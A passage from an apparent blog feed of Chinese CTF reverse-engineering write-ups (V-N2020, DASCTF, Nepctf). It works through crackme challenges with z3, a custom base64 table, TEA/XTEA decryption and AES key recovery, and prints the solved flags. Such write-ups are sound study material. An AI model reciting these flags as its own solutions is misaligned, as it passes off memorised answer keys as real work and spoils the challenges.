fun!&#39;)</span><br><span class="line">else:</span><br><span class="line">    print(&#39;Sorry,plz try again...&#39;)</span><br></pre></td></tr></table></figure><p>方程组+异或</p><blockquote><p>exp</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x&#x3D;Solver()</span><br><span class="line">a1,a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14&#x3D;Ints(&quot;a1 a2 a3 a4 a5 a6 a7 a8 a9 a10 a11 a12 a13 a14&quot;)</span><br><span class="line">x.add(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 &#x3D;&#x3D; 22748)</span><br><span class="line">x.add(a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 &#x3D;&#x3D; 7258)</span><br><span class="line">x.add(a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 &#x3D;&#x3D; 26190)</span><br><span class="line">x.add(a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + a8 * 128 - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 &#x3D;&#x3D; 37136)</span><br><span class="line">x.add(a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 &#x3D;&#x3D; 27915)</span><br><span class="line">x.add(a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 &#x3D;&#x3D; 17298)</span><br><span class="line">x.add(a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 &#x3D;&#x3D; 19875)</span><br><span class="line">x.add(a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 &#x3D;&#x3D; 22784)</span><br><span class="line">x.add(a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 &#x3D;&#x3D; 9710)</span><br><span class="line">x.add(a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 &#x3D;&#x3D; 13376)</span><br><span class="line">x.add(a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 &#x3D;&#x3D; 24065)</span><br><span class="line">x.add(a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 &#x3D;&#x3D; 27687)</span><br><span class="line">x.add(a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 &#x3D;&#x3D; 29250)</span><br><span class="line">x.add(a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 &#x3D;&#x3D; 15317)</span><br><span class="line">if x.check()&#x3D;&#x3D;sat:</span><br><span class="line">    print(x.model())</span><br><span class="line">    </span><br><span class="line">a&#x3D;[10,24,119,7,104,43,28,91,108,52,88,74,88,33]</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(len(a)-2,-1,-1):</span><br><span class="line">    flag+&#x3D;chr(a[i]^a[i+1])</span><br><span class="line">    a[i]&#x3D;a[i]^a[i+1]</span><br><span class="line">flag &#x3D; flag[::-1]</span><br><span class="line">flag +&#x3D; chr(33)</span><br><span class="line">import hashlib as hb</span><br><span class="line">print(&quot;flag&#123;&quot;+hb.md5(str(flag).encode()).hexdigest()+&quot;&#125;&quot;)</span><br></pre></td></tr></table></figure><blockquote><p>flag{58964088b637e50d3a22b9510c1d1ef8}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>V-N2020 公开赛</title>
      <link href="2021/03/28/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
      <url>2021/03/28/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRe"><a href="#CSRe" class="headerlink" title="CSRe"></a>CSRe</h1><a id="more"></a><p>Exeinfo PE查看程序，为C#，而且被混淆。<br>de4dot去除混淆。</p><p><img src="/2021/03/28/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B/1.png"></p><p>拖入dnSpy32位中。</p><p><img src="/2021/03/28/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B/2.png"></p><p><img src="/2021/03/28/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B/3.png"></p><p>然后去在线解密，第一个解出来为314159，第二个为return.</p><blockquote><p>flag{1415turn}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF</title>
      <link href="2021/03/28/DASCTF/"/>
      <url>2021/03/28/DASCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="Enjoyit-1"><a href="#Enjoyit-1" class="headerlink" title="Enjoyit-1"></a>Enjoyit-1</h1><a id="more"></a><p>首先查看文件信息</p><p><img src="/2021/03/28/DASCTF/1.png"></p><p>是C#文件，32位，放入dnSpy32位中。</p><p><img src="/2021/03/28/DASCTF/2.png"></p><p>第18行是输入判断，输入的字符范围为ASCII码95-122位。<br>第21行是变过密码表的base64加密并判断是否与yQXHyBvN3g/81gv51QXG1QTBxRr/yvXK1hC=相等。<br>第26-29行是一个循环，运行程序这个循环会运行100000秒。<br>第31行是xtea加密的变形。<br>第37-41行是一个异或。</p><h2 id="方法一：静态分析"><a href="#方法一：静态分析" class="headerlink" title="方法一：静态分析"></a>方法一：静态分析</h2><p>base64解密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char a[]&#x3D;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char b[]&#x3D;&quot;abcdefghijklmnopqrstuvwxyz0123456789+&#x2F;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x3D;&quot;;</span><br><span class="line">    char c[]&#x3D;&quot;yQXHyBvN3g&#x2F;81gv51QXG1QTBxRr&#x2F;yvXK1hC&#x3D;&quot;;</span><br><span class="line">    int i,j;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;strlen(a);j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(b[j]&#x3D;&#x3D;c[i])</span><br><span class="line">            &#123;</span><br><span class="line">                c[i]&#x3D;a[j];</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;strlen(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>原密文:Y29tYnVzdGlibGVfb29sb25nX3RlYV9wbHo=<br>在线解密得：combustible_oolong_tea_plz</p></blockquote><p>有xtea加密得到的array：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"> </span><br><span class="line">void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[26]) &#123;</span><br><span class="line">    unsigned int i;</span><br><span class="line">    uint32_t v0&#x3D;v[0], v1&#x3D;v[1], sum&#x3D;0, delta&#x3D;2654435464U;</span><br><span class="line">    for (i&#x3D;0; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 +&#x3D; (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);</span><br><span class="line">        sum +&#x3D; delta;</span><br><span class="line">        v1 +&#x3D; (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[0]&#x3D;v0; v[1]&#x3D;v1;</span><br><span class="line">&#125;</span><br><span class="line"> int main()</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t v[2]&#x3D;&#123;288,369&#125;;</span><br><span class="line">    uint32_t const k[26]&#x3D;&#123;0x63,0x6f,0x6d,0x62,0x75,0x73,0x74,0x69,0x62,0x6c,0x65,0x5f,0x6f,0x6f,0x6c,0x6f,0x6e,0x67,0x5f,0x74,0x65,0x61,0x5f,0x70,0x6c,0x7a&#125;;</span><br><span class="line">    unsigned int r&#x3D;32;</span><br><span class="line">    encipher(r, v, k);</span><br><span class="line">    printf(&quot;%0x%0x&quot;,v[0],v[1]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将所得的数字当作字符串</p><blockquote><p>6308fe34b7fe6fdb</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char a[32]&#x3D;&#123; 2, 5, 4, 13, 3, 84, 11, 4, 87, 3, 86, 3, 80, 7, 83, 3, 0, 4, 83, 94, 7, 84, 4, 0, 1, 83, 3, 84, 6, 83, 5, 80 &#125;;</span><br><span class="line">    char b[16]&#x3D;&quot;6308fe34b7fe6fdb&quot;;</span><br><span class="line">    int i;</span><br><span class="line">    for(i&#x3D;0;i&lt;32;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i]&#x3D;a[i]^b[i%16];</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;flag&#123;%s&#125;&quot;,a);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{4645e180540ffa7a67cfa174cde105a2}</p></blockquote><h2 id="方法二：修改程序"><a href="#方法二：修改程序" class="headerlink" title="方法二：修改程序"></a>方法二：修改程序</h2><p>我们若直接输入combustible_oolong_tea_plz，程序运行100000秒后才会出flag，这是因为26-29行的循环。<br>只要把这个循环删去就行了。比静态分析简单多了。<br><img src="/2021/03/28/DASCTF/3.png"></p><blockquote><p>flag{4645e180540ffa7a67cfa174cde105a2}</p></blockquote><h1 id="drinkSomeTea"><a href="#drinkSomeTea" class="headerlink" title="drinkSomeTea"></a>drinkSomeTea</h1><p>32位文件，无壳</p><p><img src="/2021/03/28/DASCTF/4.PNG"></p><p>进入main函数f5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  HANDLE v3; &#x2F;&#x2F; eax</span><br><span class="line">  void *v4; &#x2F;&#x2F; esi</span><br><span class="line">  int result; &#x2F;&#x2F; eax</span><br><span class="line">  DWORD v6; &#x2F;&#x2F; edi</span><br><span class="line">  char *v7; &#x2F;&#x2F; esi</span><br><span class="line">  DWORD v8; &#x2F;&#x2F; ebx</span><br><span class="line">  HANDLE v9; &#x2F;&#x2F; eax</span><br><span class="line">  void *v10; &#x2F;&#x2F; esi</span><br><span class="line">  DWORD NumberOfBytesRead; &#x2F;&#x2F; [esp+Ch] [ebp-8h]</span><br><span class="line">  DWORD NumberOfBytesWritten; &#x2F;&#x2F; [esp+10h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  sub_401000();</span><br><span class="line">  sub_4013B2(aWelcomeToMyTea);</span><br><span class="line">  v3 &#x3D; CreateFileA(FileName, 0xC0000000, 0, 0, 3u, 0x80u, 0);</span><br><span class="line">  v4 &#x3D; v3;</span><br><span class="line">  if ( v3 &#x3D;&#x3D; -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4013B2(aIThinkYouDoNot);</span><br><span class="line">    result &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v6 &#x3D; GetFileSize(v3, 0);</span><br><span class="line">    if ( v6 &lt; 0xEA60 )</span><br><span class="line">    &#123;</span><br><span class="line">      SetFilePointer(v4, 0, 0, 0);</span><br><span class="line">      NumberOfBytesRead &#x3D; 0;</span><br><span class="line">      ReadFile(v4, &amp;unk_409988, v6, &amp;NumberOfBytesRead, 0);</span><br><span class="line">      CloseHandle(v4);</span><br><span class="line">      if ( (v6 &gt;&gt; 3) &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 &#x3D; &amp;unk_409988;</span><br><span class="line">        v8 &#x3D; v6 &gt;&gt; 3;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">          (loc_4010A0)(v7, &amp;unk_407030);</span><br><span class="line">          v7 +&#x3D; 8;</span><br><span class="line">          --v8;</span><br><span class="line">        &#125;</span><br><span class="line">        while ( v8 );</span><br><span class="line">      &#125;</span><br><span class="line">      v9 &#x3D; CreateFileA(aTeaPngOut, 0xC0000000, 0, 0, 2u, 0x80u, 0);</span><br><span class="line">      v10 &#x3D; v9;</span><br><span class="line">      if ( v9 &#x3D;&#x3D; -1 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_4013B2(aIThinkYouDoNot);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        NumberOfBytesWritten &#x3D; 0;</span><br><span class="line">        WriteFile(v9, &amp;unk_409988, v6, &amp;NumberOfBytesWritten, 0);</span><br><span class="line">        CloseHandle(v10);</span><br><span class="line">        sub_4013B2(aNowThisCupOfTe);</span><br><span class="line">      &#125;</span><br><span class="line">      result &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4013B2(aYourTeaIsTooHo);</span><br><span class="line">      result &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致意思就是读取tea.png，经过(loc_4010A0)(v7, &amp;unk_407030)后，得到了文件tea.png.out<br>loc_4010A0有一个花指令</p><p><img src="/2021/03/28/DASCTF/5.PNG"></p><p>按‘d’转为数据</p><p><img src="/2021/03/28/DASCTF/6.PNG"></p><p>nop掉0E8h，剩余部分按‘c’转为代码</p><p><img src="/2021/03/28/DASCTF/7.PNG"></p><p>按‘p’创建函数，然后就能f5了</p><p><img src="/2021/03/28/DASCTF/8.PNG"></p><p>密钥</p><p><img src="/2021/03/28/DASCTF/9.PNG"></p><p>这个tea加密的数据都是interesting型的，所以要将普通的脚本改一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void decrypt (int* v, int* k) </span><br><span class="line">&#123;</span><br><span class="line">    int v0&#x3D;v[0], v1&#x3D;v[1], sum&#x3D;0xC6EF3720, i;  &#x2F;* set up *&#x2F;</span><br><span class="line">    int delta&#x3D;0x9e3779b9;                     &#x2F;* a key schedule constant *&#x2F;</span><br><span class="line">    int k0&#x3D;k[0], k1&#x3D;k[1], k2&#x3D;k[2], k3&#x3D;k[3];   &#x2F;* cache key *&#x2F;</span><br><span class="line">    for (i&#x3D;0; i&lt;32; i++) &#123;                         &#x2F;* basic cycle start *&#x2F;</span><br><span class="line">        v1 -&#x3D; ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3);</span><br><span class="line">        v0 -&#x3D; ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1);</span><br><span class="line">        sum -&#x3D; delta;</span><br><span class="line">    &#125;                                              &#x2F;* end cycle *&#x2F;</span><br><span class="line">    v[0]&#x3D;v0; v[1]&#x3D;v1;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int v[14656];</span><br><span class="line">    int k[4]&#x3D;&#123;0x67616C66, 0x6B61667B, 0x6C665F65, 0x7D216761&#125;;</span><br><span class="line">    int i;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp &#x3D; fopen(&quot;.&#x2F;tea.png.out&quot;, &quot;rb&quot;);</span><br><span class="line">    fread(&amp;v, 4, 14656, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    for(i&#x3D;0;i&lt;14656;i+&#x3D;2)</span><br><span class="line">    &#123;</span><br><span class="line">        decrypt(&amp;v[i], k);</span><br><span class="line">    &#125;</span><br><span class="line">    fp &#x3D; fopen(&quot;.&#x2F;tea.png&quot;, &quot;wb&quot;);</span><br><span class="line">    fwrite(&amp;v, 4, 14656, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/03/28/DASCTF/tea.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nepctf</title>
      <link href="2021/03/28/Nepctf/"/>
      <url>2021/03/28/Nepctf/</url>
      
        <content type="html"><![CDATA[<h1 id="hardcsharp"><a href="#hardcsharp" class="headerlink" title="hardcsharp"></a>hardcsharp</h1><a id="more"></a><p>⽤dnspy32位打开，可发现是aes加密<br>反编译代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line"></span><br><span class="line">namespace hardcsharp</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F; Token: 0x02000002 RID: 2</span><br><span class="line">internal class Program</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F; Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250</span><br><span class="line">private static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">AesClass aesClass &#x3D; new AesClass();</span><br><span class="line">string text &#x3D; &quot;&quot;;</span><br><span class="line">string strB &#x3D; </span><br><span class="line">&quot;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH&#x2F;3Wh0&quot;;</span><br><span class="line">byte[] array &#x3D; new byte[]</span><br><span class="line">&#123;</span><br><span class="line">81, 82, 87, 81, 82, 87, 68, 92, 94, 86, 93, 18, 18, 18, 18, 18, 18, 18, 18, </span><br><span class="line">18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18</span><br><span class="line">&#125;;</span><br><span class="line">Console.WriteLine(&quot;Welcome to nepnep csharp test! plz input the magical code:&quot;);</span><br><span class="line">string text2 &#x3D; Console.ReadLine();</span><br><span class="line">if (text2.Length !&#x3D; 37)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(&quot;Nope!&quot;);</span><br><span class="line">Console.ReadKey();</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">if (text2.Substring(0, 4) !&#x3D; &quot;Nep&#123;&quot; || text2[36] !&#x3D; &#39;&#125;&#39;)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(&quot;Nope!&quot;);</span><br><span class="line">Console.ReadKey();</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">for (int i &#x3D; 0; i &lt; 32; i++)</span><br><span class="line">&#123;</span><br><span class="line">text +&#x3D; Convert.ToChar((int)(array[i] ^ 51)).ToString();</span><br><span class="line">&#125;</span><br><span class="line">if (string.Compare(aesClass.AesEncrypt(text2, text), strB) &#x3D;&#x3D; 0)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(&quot;wow, you pass it!&quot;);</span><br><span class="line">Console.ReadKey();</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">Console.WriteLine(&quot;Nope!&quot;);</span><br><span class="line">Console.ReadKey();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public string AesEncrypt(string str, string key)</span><br><span class="line">&#123;</span><br><span class="line">if (string.IsNullOrEmpty(str))</span><br><span class="line">&#123;</span><br><span class="line">return null;</span><br><span class="line">&#125;</span><br><span class="line">byte[] bytes &#x3D; Encoding.UTF8.GetBytes(str);</span><br><span class="line">byte[] array &#x3D; new RijndaelManaged</span><br><span class="line">&#123;</span><br><span class="line">Key &#x3D; Encoding.UTF8.GetBytes(key),</span><br><span class="line">Mode &#x3D; CipherMode.ECB,</span><br><span class="line">Padding &#x3D; PaddingMode.PKCS7</span><br><span class="line">&#125;.CreateEncryptor().TransformFinalBlock(bytes, 0, bytes.Length);</span><br><span class="line">return Convert.ToBase64String(array, 0, array.Length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可知AES模式为ECB，填充模式为PKCS7Padding<br>解出来密钥：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int num[32]&#x3D;&#123;81, 82, 87, 81, 82, 87, 68, 92, 94, 86, 93, 18, 18, 18, 18, 18, 18, 18, </span><br><span class="line">    18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18&#125;;</span><br><span class="line">    int i;</span><br><span class="line">    for (i&#x3D;0;i&lt;32;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        num[i]^&#x3D;51;</span><br><span class="line">    &#125;</span><br><span class="line">    for 